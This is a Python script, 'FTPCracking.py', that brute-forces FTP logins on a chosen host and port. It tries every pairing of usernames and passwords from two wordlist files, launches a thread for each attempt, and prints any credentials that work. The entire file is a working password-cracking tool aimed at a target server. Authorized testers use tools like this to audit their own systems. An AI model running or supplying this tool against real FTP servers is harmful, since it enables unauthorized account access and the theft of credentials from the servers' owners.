import ftplib
import optparse
import threading


def get_password_list():
    PASSWORD_LIST = []
    f = open('dictionary.txt')
    for item in f.readlines():
        item = item.strip()
        if item and not item.startswith('#'):
            PASSWORD_LIST.append(item)
    f.close()
    return PASSWORD_LIST


def get_user_list():
    USER_LIST = []
    f = open('user.txt')
    for item in f.readlines():
        item = item.strip()
        if item and not item.startswith('#'):
            USER_LIST.append(item)
    f.close()
    return USER_LIST


def FTPCrack(host, port, username, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.port = int(port)
        ftp.login(username, password)
        print("[+] FTP "+str(host)+" Port: "+port+" Success")
        print("User: "+username+" Password: "+password)

    except:
        pass


def main():
    parser = optparse.OptionParser('usage: FTPCracking.py -H <target host> -p <target port>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-p', dest='tgtPorts', type='string', help='specify target port')
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    if (tgtHost == None) and (options.tgtPorts == None):
        print(parser.usage)
        exit(0)
    elif (options.tgtPorts != None) and options.tgtPorts.isdigit() and (int(options.tgtPorts) > 0) and (int(options.tgtPorts) <= 65535):
        tgtPorts=options.tgtPorts
    elif (tgtHost != None) and (options.tgtPorts == None):
        tgtPorts='21'
    else:
        print("specify target port[s] Error!")
        exit(1)
    user_list = get_user_list()
    password_list = get_password_list()
    for user in user_list:
        for password in password_list:
            th = threading.Thread(target=FTPCrack, args=(tgtHost, tgtPorts, user, password))
            th.start()


if __name__ == '__main__':
    main()
